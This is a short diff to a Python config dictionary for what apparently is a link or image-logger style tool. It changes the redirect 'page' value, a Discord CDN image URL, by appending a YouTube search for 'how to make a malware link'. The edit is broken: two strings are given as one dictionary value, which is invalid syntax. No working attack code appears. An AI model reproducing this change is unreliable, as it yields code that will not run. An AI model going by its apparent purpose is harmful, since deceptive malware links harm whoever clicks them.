@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://cdn.discordapp.com/attachments/1200874164953817293/1200915298417647706/mvHmXtQ.png?ex=65c7ea87&is=65b57587&hm=504554a88e7f023421080a1e86a7d9b41a89b885dab24ca12bc9a14db1583d0f&" # Link to the webpage to redirect to 
+        "page": "https://cdn.discordapp.com/attachments/1200874164953817293/1200915298417647706/mvHmXtQ.png?ex=65c7ea87&is=65b57587&hm=504554a88e7f023421080a1e86a7d9b41a89b885dab24ca12bc9a14db1583d0f&", "https://www.youtube.com/results?search_query=how+to+make+a+malware+link" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
